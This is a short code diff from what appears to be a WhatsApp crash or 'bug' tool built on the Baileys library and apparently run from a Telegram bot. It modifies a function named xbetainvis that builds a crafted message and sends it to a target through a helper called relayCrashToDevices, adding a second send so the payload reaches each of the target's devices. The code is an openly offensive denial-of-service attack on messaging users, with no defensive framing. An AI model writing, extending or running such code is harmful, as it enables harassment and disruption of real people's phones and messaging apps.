@@ -25,9 +25,7 @@ const { relayCrashToDevices } = require('../target-utils');
  * or termination of the Telegram bot.
  */
 
-const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
-const pino = require('pino');
-const crypto = require('crypto');
+const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 
 async function xbetainvis(SYxS7, target) {
     const msg = generateWAMessageFromContent(target, {
@@ -58,15 +56,14 @@ async function xbetainvis(SYxS7, target) {
     });
 
     try {
-        await SYxS7.relayMessage(target, {
+        await relayCrashToDevices(SYxS7, target, {
             groupStatusMessageV2: {
                 message: msg.message
             }
-        }, {
-            messageId: null
         });
+        await relayCrashToDevices(SYxS7, target, msg.message);
     } catch (error) {
-        console.log(`[ 🗑️ ] Error on message: ${error.message}`);
+        console.log(`[ 🗑️ ] Error on xbetainvis message: ${error.message}`);
     }
 }
 
